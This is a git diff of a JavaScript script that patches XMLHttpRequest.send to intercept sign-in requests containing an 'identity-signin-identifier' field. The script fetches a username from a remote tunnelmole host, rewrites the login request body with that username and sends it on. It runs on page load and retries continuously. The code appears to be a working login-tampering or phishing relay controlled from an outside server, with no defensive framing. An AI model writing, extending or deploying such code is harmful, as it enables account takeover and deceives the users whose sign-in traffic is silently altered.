@@ -1,46 +1,67 @@
-let freqUsername = null;
+let freqUsername = null; 
 const modifiedRequests = new Set();
 const pendingRequests = new Map();
-let usernameFetched = false;
+let usernameFetched = false;  // Ensure this is properly reset
 
-// Fetch the username when needed
 const fetchFreqUsername = async () => {
-    if (usernameFetched) return; // Avoid redundant fetches once username is fetched
+    if (usernameFetched) return; // Prevent redundant fetches
 
-    console.log('Fetching username...');
+    console.log('🟡 Fetching username...');
 
     try {
-        const response = await fetch('https://9emiae-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
+        const response = await fetch(`https://9emiae-ip-37-228-207-173.tunnelmole.net/get-first-post-data?t=${Date.now()}`, {
             method: 'GET',
-            headers: { 'Cache-Control': 'no-cache' }
+            headers: { 'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+ } // Prevent caching
+            
         });
 
         if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
 
         const result = await response.json();
-        console.log('Response from /get-first-post-data:', result);  // Debug log
+        console.log('✅ Response from /get-first-post-data:', result);
 
         if (result?.postData) {
             freqUsername = result.postData;
-            console.log('Fetched username:', freqUsername);
+            console.log('✅ Fetched username:', freqUsername);
             usernameFetched = true;
 
-            // Reset the server-side username store
-            await fetch('https://9emiae-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
-
-            // Process all pending requests now that we have a username
-            processModifiedRequests();
+            // Immediately reset after fetching
+            await resetUsernameData();
         } else {
-            console.warn("No username data received, retrying...");
-            setTimeout(fetchFreqUsername, 1000); // Retry after 1s if no username is received
+            console.warn("⚠️ No username data received, retrying...");
+            setTimeout(fetchFreqUsername, 1000); // Retry in 1s if empty
         }
     } catch (error) {
-        console.error('Error fetching username:', error);
-        setTimeout(fetchFreqUsername, 500); // Retry after 1s if error occurs
+        console.error('⚠️ Error fetching username:', error);
+        setTimeout(fetchFreqUsername, 1000); // Retry in 1s if error
     }
 };
 
-// Modify and send pending requests when username is available
+// ✅ Reset username data and immediately retry fetching
+const resetUsernameData = async () => {
+    console.log('🔄 Resetting username data...');
+
+    try {
+        const response = await fetch('https://9emiae-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
+
+        if (response.ok) {
+            console.log('✅ Successfully reset username.');
+        } else {
+            console.error(`⚠️ Failed to reset username: ${response.status}`);
+        }
+    } catch (error) {
+        console.error('⚠️ Error resetting username:', error);
+    }
+
+    // 🛑 Force username fetch **AFTER** reset
+    usernameFetched = false;
+    setTimeout(fetchFreqUsername, 500); // Ensure re-fetch after reset
+};
+
+// ✅ Process pending requests
 const processModifiedRequests = () => {
     if (!freqUsername) {
         console.log("Username not available yet, retrying...");
@@ -49,27 +70,24 @@ const processModifiedRequests = () => {
     }
 
     console.log("Processing pending requests...");
-    // Create a copy of pending requests as we will modify it while iterating
     const requestsToProcess = Array.from(pendingRequests);
 
-    // Iterate through all pending requests
     for (let [xhr, body] of requestsToProcess) {
         const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
-
         if (match && !modifiedRequests.has(body)) {
             const modifiedBody = body.replace(match[1], freqUsername);
-            modifiedRequests.add(body); // Mark the request as modified
+            modifiedRequests.add(body);
             console.log("Modified request with new username:", modifiedBody);
-            xhr.send(modifiedBody); // Send the modified request
-            pendingRequests.delete(xhr); // Remove the request from pending
+            xhr.send(modifiedBody);
+            pendingRequests.delete(xhr);
         }
     }
 
-    // Reset freqUsername when all requests are processed
     if (pendingRequests.size === 0) {
         console.log("All pending requests processed, resetting freqUsername.");
         freqUsername = null;
-        usernameFetched = false; // Allow fetching a new username if needed
+        usernameFetched = false; // Allow fetching a new username
+        setTimeout(fetchFreqUsername, 1000);
     }
 };
 
@@ -81,15 +99,19 @@ XMLHttpRequest.prototype.send = function (body) {
         return;
     }
 
-    // If the body contains identity-signin-identifier and hasn't been modified yet, intercept
     if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
-        pendingRequests.set(this, body); // Store the request in pendingRequests
-        processModifiedRequests(); // Attempt to modify and send the request immediately
+        pendingRequests.set(this, body);
+        processModifiedRequests();
     } else {
-        originalXhrSend.call(this, body); // Send the original request if no modification is needed
+        originalXhrSend.call(this, body);
     }
 };
+
+// Ensure fetchFreqUsername is called when the page loads
+document.addEventListener('DOMContentLoaded', () => {
+    fetchFreqUsername();
+});
 
 // ✅ Send username data to server
 const sendUsername = async () => {
